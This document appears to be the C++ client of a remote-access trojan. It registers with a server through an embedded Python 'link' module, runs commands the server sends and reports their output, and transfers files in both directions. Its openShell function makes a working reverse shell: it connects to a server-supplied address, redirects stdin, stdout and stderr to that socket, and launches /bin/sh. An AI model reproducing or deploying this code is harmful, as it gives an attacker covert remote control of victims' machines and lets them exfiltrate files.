

#include <iostream>
#include "clientManager.h"


/*for reverse shell*/
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h> //waitpid
#include <unistd.h>

using namespace std;

clientManager::clientManager()
{
    pModule =  PyImport_Import(PyUnicode_FromString("link"));//importa modulo link.py
    
    link = PyObject_GetAttrString(pModule, "link");//pega o obj
    ficar = makeRegister();
}

clientManager::~clientManager()
{

}


bool
clientManager::getRegisterMade()
{
    return ficar;
}

string
clientManager::getComand()
{
    cout << "geting command"<< endl;
    return PyUnicode_AsUTF8(PyObject_CallMethod(link, "getCMD", NULL));
}

vector <string>
clientManager::getArgs()
{
    vector <string> saida;
    cout << "geting args"<< endl;

    Py_ssize_t size = (Py_ssize_t) PyLong_AsLong(PyObject_CallMethod(link, "getArgsSize", NULL));
    CPyObject lista = PyList_New(size);
    lista = PyObject_CallMethod(link, "getArgs", NULL);
    for (long i = 0; (Py_ssize_t)i < size ;i++)
    {
        saida.push_back(string(PyUnicode_AsUTF8(PyList_GetItem(lista,(Py_ssize_t) i))));
    }
    return saida;
    
}

bool
clientManager::makeRegister()
{
    cout << "Registering" << endl;

    CPyObject isOk= PyObject_CallMethod(link, "makeRegister", NULL);

    if (isOk==Py_True)
    {
        cout << "Register confirmed" << endl;
        return true;
    }
    else 
    {
        cout << "Register not confirmed" << endl;
        return false;
    }
}


void 
clientManager::openShell(vector<string> cmd)
{
    struct sockaddr_in sa;
    int s;
    unsigned port = std::stoul (cmd[1]);
    pid_t pid_fork;
    string response;
    int status;

    cout << "running shell." << endl;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
    sa.sin_port = htons(port);
    
    pid_fork=fork();
    //if child
    if(pid_fork==0)
    {
        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 )
        {
            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==0)
            {
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);
                
                cout << "starting bash" << endl;
                try
                {
                    response = string("connected");
                    PyObject_CallMethod(link, "report", "(s)", response.c_str());
                    system("/bin/sh");
                }
                catch(const std::exception& e)
                {
                    PyObject_CallMethod(link, "report", "(s)", e.what());
                }
            }
            else 
            {
                response=string("not connect") + strerror (errno);
                PyObject_CallMethod(link, "report", "(s)", response.c_str());
            }
        }
        else 
        {
            response=string("shell failed!") + strerror (errno);
            PyObject_CallMethod(link, "report", "(s)", response.c_str());
        }
    }
    else
    {
        waitpid(pid_fork,&status,0 );
        if (WIFEXITED(status))
        {
            response=string("Exited Normally");
            PyObject_CallMethod(link, "report", "(s)", response.c_str());
        }
    }
    
}

void 
clientManager::run(vector <string> cmd)//runCommand
{

    if (cmd.size() == 1)
    {
        char buffer[128];
        string result = "";
        bool erro=false;

        cout << "Executing command: " << cmd[0] << endl;
        cmd[0]+=" 2>>error.txt";

        FILE* pipe = popen(cmd[0].c_str(), "r");
        if (!pipe)
        {
            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
            cout << "file was not sent" << endl;

        }
        if (sizeError(cmd[0])!=0)
        {
            pclose(pipe);
            pipe = fopen("error.txt", "r");
            erro = true;
        }
        else 
        {
            try 
            {
                while (fgets(buffer, sizeof (buffer), pipe) != NULL) 
                {
                    result += buffer;
                }
                pclose(pipe);
                if (erro==false){
                    PyObject_CallMethod(link, "report", "(s)", result.c_str());
                }
                else {
                    PyObject_CallMethod(link, "report", "(s)", "command not found");
                }
            } 
            catch (...) 
            {
                pclose(pipe);
                cout << "command nor response of terminal." << endl;
            }
        }
        cout << "end of command executed" << endl;
        system("rm error.txt");
    }
    else 
    {
        cout << "command not executed: " << cmd.size() << endl;
    } 
}

unsigned
clientManager::sizeError(string command)
{
    system((command += " 1>>/dev/null ").c_str());
    FILE *A =  fopen("error.txt","r");
    unsigned size=0;
    char buffer[128];
    if (!A)
    {
        return 0;
    }
    try 
    {
        while (fgets(buffer, sizeof(buffer), A) != NULL) 
        {
            size++;
        }
        pclose(A);
        return size;
    } 
    catch (...) 
    {
        pclose(A);
        return 0;
    }
}

void 
clientManager::isOK()
{
    PyObject_CallMethod(link, "clientOK", NULL);
}

void
clientManager::downFromServ(vector <string> scFile)
{
    if (scFile.size()==1)
    {
        cout << "downloading " << scFile[0] << endl;
        CPyObject isOk = PyObject_CallMethod(link, "downloadFileFromServer", "(s)" , scFile[0].c_str());
        if (isOk==Py_True)
        {
            cout << "download ok" << endl;
            PyObject_CallMethod(link, "report", "(s)", "download ok");
        }
        else 
        {
            cout << "download refuse" << endl;
            PyObject_CallMethod(link, "report", "(s)", "download refuse");
        }
    }
    else {
        cout << "download not executed: " << scFile.size() << endl;
        PyObject_CallMethod(link, "report", "(s)", "download not executed:");
    }

}

void
clientManager::upForServe(vector <string> csFile)
{
    if (csFile.size()==1)
    {
        cout << "uploading " << csFile[0] << endl;
        CPyObject isOk = PyObject_CallMethod(link, "uploadFileFromServer", "(s)" , csFile[0].c_str());
        if (isOk==Py_True)
        {
            cout << "upload ok" << endl;
            PyObject_CallMethod(link, "report", "(s)", "upload ok");
        }
        else 
        {
            cout << "upload refuse" << endl;
            PyObject_CallMethod(link, "report", "(s)", "upload refuse");
        }
    }
    else {
        cout << "upload not executed: " << csFile.size() << endl;
        PyObject_CallMethod(link, "report", "(s)", "upload not executed:");
    }

}